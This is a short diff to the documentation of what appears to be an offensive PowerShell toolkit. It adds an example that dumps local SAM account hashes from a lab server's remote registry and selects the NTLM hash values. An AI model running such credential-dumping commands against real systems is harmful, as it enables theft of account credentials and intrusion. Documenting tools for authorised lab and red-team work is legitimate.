@@ -421,6 +421,8 @@ Derives local SAM account hashes using the remote registry (backup semantics req
 
 ```powershell
 Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegSamHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
+  Select-Object AccountName, FullName, Rid, NtlmHashText
 ```
 
 #### Find-TBORegWeakServices
